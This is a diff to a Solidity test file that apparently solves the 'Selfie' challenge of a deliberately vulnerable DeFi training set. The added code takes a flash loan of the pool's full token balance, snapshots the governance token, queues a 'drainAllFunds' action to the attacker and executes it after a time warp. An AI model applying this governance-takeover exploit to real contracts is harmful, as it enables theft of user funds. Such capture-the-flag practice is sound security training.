@@ -12,6 +12,8 @@ contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
     uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
 
+    uint256 internal actionId;
+
     Utilities internal utils;
     SimpleGovernance internal simpleGovernance;
     SelfiePool internal selfiePool;
@@ -45,9 +47,31 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        uint256 selfiePoolBalance = dvtSnapshot.balanceOf(address(selfiePool));
+        selfiePool.flashLoan(selfiePoolBalance);
+        vm.warp(block.timestamp + 2 days);
+        simpleGovernance.executeAction(actionId);
         /** EXPLOIT END **/
         validation();
+    }
+
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(
+            tokenAddress
+        );
+
+        token.snapshot();
+
+        bytes memory drainAllFundsPayload = abi.encodeWithSignature(
+            "drainAllFunds(address)",
+            address(attacker)
+        );
+        actionId = simpleGovernance.queueAction(
+            address(selfiePool),
+            drainAllFundsPayload,
+            0
+        );
+        token.transfer(address(selfiePool), amount);
     }
 
     function validation() internal {
